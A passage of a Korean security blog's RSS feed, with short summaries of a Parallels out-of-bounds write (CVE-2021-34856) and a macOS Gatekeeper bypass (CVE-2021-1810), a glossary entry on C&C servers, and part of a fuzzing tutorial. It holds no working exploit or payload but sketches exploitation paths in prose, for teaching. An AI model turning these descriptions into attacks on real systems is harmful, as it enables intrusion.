&#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">MOV dword ptr [R9 + DAT_00048b04], EBX  <span class="hljs-comment">//Guest supplied data</span>...MOV  R9, R14MOV  EAX, dword ptr [R9 + DAT_00048b04]MOV  dword ptr [R9 + RAX*<span class="hljs-number">0x4</span> + <span class="hljs-number">0x48af8</span>], EBX</code></pre><p>&#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; Guest &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xAE30; &#xC704;&#xD55C; index&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, index &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD560; &#xB54C; &#xBC94;&#xC704; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC544; data &#xC139;&#xC158;&#xC5D0; out-of-bounds write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; port I/O &#xAC00; &#xC218;&#xD589;&#xB420; &#xB54C;  bss &#xC139;&#xC158;&#xC758; <code>io_port_handler</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xBC1B;&#xC544; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294;  <code>AhciIdpIndexInPortFunc</code>&#xC640; <code>AhciIdpIndexOutPortFunc</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xAC01;&#xAC01; aribtrary read/write &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800;&#xC5D0;&#xC11C; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xACE0; Host&#xB85C; escape&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/parallels/">parallels</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/macos/">macos</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-34856/">cve-2021-34856</category>
      
      <category domain="https://hackyboiz.github.io/tags/out-of-bounds/">out of bounds</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/07/l0ch/2021-10-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] C&amp;C Server</title>
      <link>https://hackyboiz.github.io/2021/10/06/y00n_nms/command-control-server/</link>
      <guid>https://hackyboiz.github.io/2021/10/06/y00n_nms/command-control-server/</guid>
      <pubDate>Wed, 06 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;C&amp;amp;C &amp;#xC11C;&amp;#xBC84;&amp;#xB294;  Command &amp;amp; Control &amp;#xC11C;&amp;#xBC84;, C2 &amp;#xC11C;&amp;#xBC84;, &amp;#xBA85;&amp;#xB839;&amp;#xC81C;&amp;#xC5B4; &amp;#xC11C;&amp;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>C&amp;C &#xC11C;&#xBC84;&#xB294;  Command &amp; Control &#xC11C;&#xBC84;, C2 &#xC11C;&#xBC84;, &#xBA85;&#xB839;&#xC81C;&#xC5B4; &#xC11C;&#xBC84; &#xB4F1; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xBD88;&#xB9AC;&#xBA70; &#xC0AC;&#xC774;&#xBC84; &#xACF5;&#xACA9;&#xC5D0;&#xC11C; &#xB450;&#xB1CC; &#xC5ED;&#xD560;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>C&amp;C &#xC11C;&#xBC84;&#xB294; &#xAC10;&#xC5FC;&#xB41C; PC(&#xC880;&#xBE44; PC)&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC6D0;&#xACA9;&#xC9C0;&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC744; &#xB0B4;&#xB9AC;&#xAC70;&#xB098; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xC785;&#xB2C8;&#xB2E4;. &#xC880;&#xBE44; PC&#xAC00; &#xB418;&#xBA74; C&amp;C &#xC11C;&#xBC84;&#xC758; &#xBA85;&#xB839;&#xC744; &#xBC1B;&#xC544; &#xD574;&#xCEE4;&#xAC00; &#xC790;&#xC2E0;&#xC758; PC&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xCEE4;&#xC758; &#xACF5;&#xACA9; &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAD00;&#xB828; &#xAE30;&#xC0AC;&#xC5D0;&#xC11C; &#xBE60;&#xC9C0;&#xC9C0; &#xC54A;&#xACE0; &#xB098;&#xC624;&#xB294; &#xD0A4;&#xC6CC;&#xB4DC;&#xB85C;, &#xCD5C;&#xADFC; &#xB274;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74; &#x2018;&#xAC10;&#xC5FC; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; HVNC&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xC9C0;&#xC815;&#xB41C; &#xBA85;&#xB839;&#xC81C;&#xC5B4;(C&amp;C) &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA70;, C&amp;C &#xC11C;&#xBC84;&#xC5D0;&#xC11C; VNC&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;(HVNC &#xAE30;&#xC900;&#xC73C;&#xB85C;&#xB294; &#xC11C;&#xBC84;)&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xB300;&#xAE30;&#xD558;&#xB358; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC6D0;&#xACA9; &#xC81C;&#xC5B4;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9C4;&#xB2E4;.&#x2019; &#xB77C;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (<a href="https://www.boannews.com/media/view.asp?idx=100986">[&#xBCF4;&#xC548;&#xB274;&#xC2A4;] &#xBD81;&#xD55C; &#xD574;&#xCEE4;&#xADF8;&#xB8F9; &#xAE40;&#xC218;&#xD0A4;, &#xC6D0;&#xACA9;&#xC81C;&#xC5B4; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC774;&#xC6A9;&#xD55C; &#xB610; &#xB2E4;&#xB978; &#xACF5;&#xACA9; &#xAC10;&#xD589;</a>)</p><p>&#xCC38;&#xACE0;&#xB85C; HVNC(Hidden Virtual Network Computing)&#xC740; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xD654;&#xBA74;&#xC774; &#xC81C;&#xC5B4;&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC778;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xCC44; &#xD574;&#xCEE4;&#xAC00; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xB2E4;&#xB978; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD654;&#xBA74; &#xC81C;&#xC5B4; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>5&#xB144; &#xC804;&#xC758; 2016&#xB144; 4&#xBD84;&#xAE30;&#xC5D0;&#xB294; C&amp;C &#xC11C;&#xBC84;&#xC758; &#xC57D; 59%&#xAC00; &#xD55C;&#xAD6D;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC870;&#xC0AC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/c-c-server/">c&amp;c server</category>
      
      <category domain="https://hackyboiz.github.io/tags/c2-sever/">c2 sever</category>
      
      <category domain="https://hackyboiz.github.io/tags/command-control-server/">command control server</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/06/y00n_nms/command-control-server/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1810: Gatekeeper bypass</title>
      <link>https://hackyboiz.github.io/2021/10/05/fabu1ous/2021-10-05/</link>
      <guid>https://hackyboiz.github.io/2021/10/05/fabu1ous/2021-10-05/</guid>
      <pubDate>Tue, 05 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.f-secure.com/blog/analysis-of-cve-2021-1810-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.f-secure.com/blog/analysis-of-cve-2021-1810-gatekeeper-bypass/">Analysis of CVE-2021-1810 Gatekeeper bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>macOS &lt; Big Sur 11.3</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>macOS&#xC758; file quarantine &#xAE30;&#xB2A5;, Gatekeeper&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. Gatekeeper&#xB294; macOS &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC0C8;&#xB86D;&#xAC8C; &#xC124;&#xCE58;&#xB418;&#xB294;, &#xD639;&#xC740; &#xCC98;&#xC74C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; Code signature &#xAC80;&#xC0AC;&#xC640; Notarization&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xCD9C;&#xCC98;&#xC640; &#xBCC0;&#xC870; &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>macOS&#xC758; &#xC774;&#xB7F0; file quarantine &#xAE30;&#xB2A5;&#xC740; file system&#xC758; &#xD655;&#xC7A5; attribute&#xC5D0; &#xC758;&#xC874;&#xD569;&#xB2C8;&#xB2E4;. file&#xC758; &#xD655;&#xC7A5; attribute&#xB780; &#xBAA8;&#xB4E0; macOS &#xC5D0;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xD30C;&#xC77C;&#xC5D0; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xC791;&#xC740; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xB73B;&#xD558;&#xBA70;, &#xADF8;&#xC911; <code>com.apple.quarantine</code>&#xC740; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; Gatekeeper&#xC758; &#xAC80;&#xC0AC;&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC2DC; &#xB9D0;&#xD558;&#xBA74;, <code>com.apple.quarantine</code> attribute&#xAC00; &#xC124;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD30C;&#xC77C;&#xC740; Gatekeeper&#xC758; &#xAC80;&#xC0AC;&#xB97C; &#xBC1B;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Safari&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC6F9; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB4E4;&#xC740; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; <code>com.apple.quarantine</code> attribute&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. zip&#xD30C;&#xC77C;&#xC758; &#xACBD;&#xC6B0; &#xC555;&#xCD95;&#xC744; &#xD480;&#xAC8C; &#xB418;&#xBA74; zip&#xD30C;&#xC77C; &#xB0B4;&#xBD80;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C; &#xB610;&#xD55C; <code>com.apple.quarantine</code> attribute&#xB97C; &#xC0C1;&#xC18D;&#xBC1B;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC5EC;&#xB7EC; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC911;&#xCCA9;&#xC2DC;&#xCF1C; &#xAE4A;&#xC740; directory hiearchy&#xB97C; &#xAC16;&#xB294; zip&#xD30C;&#xC77C;&#xC758; path name&#xC774; &#xB108;&#xBB34; &#xAE38;&#xBA74; zip &#xB0B4;&#xBD80;&#xC758; &#xD30C;&#xC77C; &#xC77C;&#xBD80;&#xAC00; <code>com.apple.quarantine</code>&#xC744; &#xC0C1;&#xC18D;&#xBC1B;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>path name&#xC774; &#xB108;&#xBB34; &#xAE38;&#xBA74; Safari&#xAC00; &#xC555;&#xCD95;&#xC744; &#xD480;&#xC9C0; &#xBABB;&#xD574; &#xB0B4;&#xBD80; &#xD30C;&#xC77C;&#xB4E4;&#xC758; attribute&#xB97C; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</li><li>path name&#xC774; &#xB108;&#xBB34; &#xAE38;&#xBA74; macOS finder&#xC758; Archive utiliy&#xAC00; &#xC555;&#xCD95;&#xC744; &#xD480; &#xB54C; &#xC77C;&#xBD80; &#xD30C;&#xC77C;&#xC5D0; attribute&#xB97C; &#xC0C1;&#xC18D;&#xC2DC;&#xD0A4;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mac/">mac</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/safari/">safari</category>
      
      <category domain="https://hackyboiz.github.io/tags/finder/">finder</category>
      
      <category domain="https://hackyboiz.github.io/tags/quarantine/">quarantine</category>
      
      <category domain="https://hackyboiz.github.io/tags/gatekeeper/">gatekeeper</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/05/fabu1ous/2021-10-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 퍼징 교양 수업 fuzz 101 - part2</title>
      <link>https://hackyboiz.github.io/2021/10/03/fabu1ous/fuzz-2/</link>
      <guid>https://hackyboiz.github.io/2021/10/03/fabu1ous/fuzz-2/</guid>
      <pubDate>Sun, 03 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot;&gt;&lt;a href=&quot;#&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot;&gt;&lt;/a&gt;&amp;#xBA38;&amp;#xB9B</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2021/10/03/fabu1ous/fuzz-2/1.gif" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. Fabu1ous&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xB9D0; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; Part 2&#xB97C; &#xB4E4;&#xACE0; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xBC88; Part 1&#xC5D0;&#xC11C; &#xD37C;&#xC9D5; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xAC00;&#xC7A5; &#xBCF4;&#xD3B8;&#xC801;&#xC778; &#xBAA8;&#xB378;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD37C;&#xC9D5; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; Preprocess&#xC640; Iteration&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70; Iteration&#xC740; Schedule, InputGen, InputEval, ConfUpdate, Continue &#xCD1D; 5&#xAC1C; &#xB2E8;&#xACC4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC911;&#xC5D0;&#xC11C; Preprocess&#xC640; Schedule &#xB2E8;&#xACC4;&#xB97C; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>Part 1&#xC744; &#xC548; &#xBCF4;&#xC168;&#xAC70;&#xB098; &#xB108;&#xBB34; &#xC624;&#xB798;&#xC804;&#xC5D0; &#xC77D;&#xC5B4;&#xC11C; &#xB0B4;&#xC6A9;&#xC774; &#xAC00;&#xBB3C;&#xAC00;&#xBB3C;&#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; Part 1&#xC744; &#xC4F1; &#xD6D1;&#xC5B4;&#xBCF4;&#xACE0; &#xC624;&#xC2DC;&#xAE38; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;. Part 1&#xC5D0;&#xC11C; &#xB2E4;&#xC591;&#xD55C; &#xC6A9;&#xC5B4;&#xB97C; &#xC815;&#xC758;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704; GIF &#xC774;&#xBBF8;&#xC9C0; &#xAC19;&#xC740; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="3-Preprocess"><a href="#3-Preprocess" class="headerlink" title="3. Preprocess"></a>3. Preprocess</h1><pre><code class="hljs livescript">Preprocess<span class="hljs-function"><span class="hljs-params">(C)</span> -&gt;</span> C</code></pre><p>&#xD37C;&#xC800;&#xC758; &#xCCAB; iteration &#xC218;&#xD589; &#xC804;&#xC5D0; &#xCD08;&#xAE30; fuzz configuration &#xC9D1;&#xD569;&#xC744; &#xC218;&#xC815;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; Preprocess, &#xC804;&#xCC98;&#xB9AC; &#xB2E8;&#xACC4;&#xB77C;&#xACE0; &#xBD80;&#xB974;&#xBA70; &#xC8FC;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>PUT&#xC5D0; &#xB300;&#xD55C; instrumentation &#xC801;&#xC6A9;</li><li>&#xC4F8;&#xBAA8;&#xC5C6;&#xB294; configuration &#xC81C;&#xAC70;</li><li>seed trimming</li><li>driver app &#xC0DD;&#xC131;</li></ol><p>Preprocess&#xB294; InputGen&#xC5D0; &#xB300;&#xD55C; &#xC900;&#xBE44; &#xB2E8;&#xACC4;&#xC758; &#xC758;&#xBBF8;&#xB3C4; &#xC9C0;&#xB2C8;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-1-Instrumentation"><a href="#3-1-Instrumentation" class="headerlink" title="3.1 Instrumentation"></a>3.1 Instrumentation</h2><p><img src="/2021/10/03/fabu1ous/fuzz-2/2.png" alt></p><p>PUT &#xCF54;&#xB4DC; &#xC0AC;&#xC774;&#xC0AC;&#xC774;&#xC5D0; instrumentation &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD574; &#xAC01; input&#xC5D0; &#xB300;&#xD55C; PUT&#xC758; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC774; &#xC5B4;&#xB514;&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;(code coverage)&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC744; Instrumenation&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><p>black-box, gray-box, white-box &#xB4F1; &#xD37C;&#xC9D5; &#xD14C;&#xC2A4;&#xD2B8;&#xC758; &#xC0C9;&#xC740; PUT&#xC758; &#xB0B4;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC774; &#xC218;&#xC9D1;&#xD558;&#xB294;&#xAC00;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9C0;&#xB294;&#xB370;, gray-box&#xC640; white-box&#xB294; PUT&#xC5D0; instrumentaion&#xC744; &#xC801;&#xC6A9;&#xD574; execution feedback&#xC744; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xADF8;&#xC5D0; &#xB9DE;&#xCDB0; &#xB354; &#xC815;&#xAD50;&#xD55C; &#xD37C;&#xC9D5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PUT &#xB0B4;&#xBD80;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xB294; &#xBC29;&#xBC95;&#xC740; processor trace, system call usage &#xB4F1; &#xB2E4;&#xC591;&#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xC911; instrumentation&#xC774; &#xAC00;&#xC7A5; &#xC4F8;&#xBAA8; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Program instrumentation&#xC740; static(&#xC815;&#xC801;)&#xACFC; dynamic(&#xB3D9;&#xC801;) &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. Static &#xBC29;&#xC2DD;&#xC740; PUT &#xC2E4;&#xD589; &#xC804; Preprocess &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC801;&#xC6A9;&#xB418;&#xACE0;, dynamic &#xBC29;&#xC2DD;&#xC740; &#xC2E4;&#xC81C;&#xB85C; PUT&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; InputEval &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC801;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><p>Static Instrumentaion</p><p>&#xC8FC;&#xB85C; &#xCEF4;&#xD30C;&#xC77C; &#xB3C4;&#xC911; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB098; intermediate code&#xC5D0; &#xC801;&#xC6A9;&#xD568;</p><p>&#xB7F0;&#xD0C0;&#xC784; &#xC804;&#xC5D0; &#xC218;&#xD589;&#xB418;&#xB2C8; &#xB2F9;&#xC5F0;&#xD788; &#xB7F0;&#xD0C0;&#xC784; &#xC624;&#xBC84;&#xD574;&#xB4DC;&#xAC00; &#xD06C;&#xC9C0; &#xC54A;&#xC74C;</p><p>PUT&#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xAC01;&#xAC01; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xAC19;&#xC740; instrumentaion &#xC801;&#xC6A9; &#xD544;&#xC694;(&#xADC0;&#xCC2E;&#xB2E4;!)</p><p>&#xC18C;&#xC2A4; &#xB808;&#xBCA8; &#xB9D0;&#xACE0; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB808;&#xBCA8;&#xC5D0;&#xC11C; static instrumentation&#xB3C4; &#xAC00;&#xB2A5;&#xD568;</p></li><li><p>Dynamic instrumentaion</p><p>&#xC624;&#xBC84;&#xD574;&#xB4DC;&#xAC00; &#xD06C;&#xC9C0;&#xB9CC; instrumentation&#xC744; PUT&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; DLL&#xC5D0; &#xADF8;&#xB54C;&#xADF8;&#xB54C; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC7A5;&#xC810;</p><p>DynInst, DynamoRIO, Valgrid, QEMU &#xB4F1; &#xB3D9;&#xC801; instrumentation tool&#xC744; &#xC0AC;&#xC6A9;</p></li></ul><p><img src="/2021/10/03/fabu1ous/fuzz-2/3.png" alt></p><p>&#xAF2D; static&#xACFC; dynamic &#xBC29;&#xC2DD; &#xC911; &#xD55C; &#xAC00;&#xC9C0; instrumentaion&#xB9CC; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD558;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; AFL&#xC740; &#xC804;&#xC6A9; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB85C; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC5D0; static instrumentation&#xC744; &#xC801;&#xC6A9;&#xD558;&#xACE0; QEMU&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB808;&#xBCA8; dynamic instrumentation&#xB3C4; &#xC801;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC9C1;&#xC811; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; external library&#xC5D0;&#xB3C4; instrumentation&#xC744; &#xC801;&#xC6A9;&#xD574; &#xC880; &#xB354; &#xC644;&#xBCBD;&#xD55C; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xB97C; &#xCE21;&#xC815;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><h3 id="3-1-1-Execution-Feedback"><a href="#3-1-1-Execution-Feedback" class="headerlink" title="3.1.1 Execution Feedback"></a>3.1.1 Execution Feedback</h3><p><img src="/2021/10/03/fabu1ous/fuzz-2/4.png" alt></p><p>gray-box &#xD37C;&#xC800;&#xB294; &#xC8FC;&#xB85C; execution feedback&#xC744; input&#xC73C;&#xB85C; &#xBC1B;&#xC544; test case&#xB97C; &#xBC1C;&#xC804;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC608;&#xB85C; AFL&#xACFC; AFL&#xB85C;&#xBD80;&#xD130; &#xD30C;&#xC0DD;&#xB41C; &#xD37C;&#xC800;&#xB4E4;&#xC740; PUT&#xC758; branch instruction&#xC5D0; intstrumentation&#xC744; &#xAC78;&#xC5B4; branch coverage 